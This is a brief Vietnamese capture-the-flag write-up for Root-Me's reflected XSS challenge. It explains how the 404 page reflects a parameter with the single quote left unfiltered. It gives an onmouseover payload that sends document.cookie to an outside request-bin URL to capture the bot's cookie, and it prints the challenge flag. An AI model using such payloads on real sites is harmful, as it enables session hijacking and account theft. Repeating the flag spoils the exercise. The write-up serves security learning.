# [XSS - Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)

## Solutions

XSS xảy ra khi thay request parameter `p` làm xuất hiện lỗi 404, server sẽ hiển thị lại tên trang không tồn tại.

Các ký tự như là `<, >, ...` đã bị lọc, tuy nhiên có ký tự `'` không bị.

Thử thay `?p=a'onmouseover='alert("a")` => OK

Sử dụng `request bin` để lắng nghe: `https://eo7srw2h4laxfe0.m.pipedream.net`

Thay `?p=a'onmouseover='document.location=%22https://eo7srw2h4laxfe0.m.pipedream.net?%22.concat(document.cookie)`, hiển thị trang báo lỗi, ấn vào nút report, chờ một lúc thấy có GET request ở `request bin`

Flag: `r3fL3ct3D_XsS_fTw`

## References
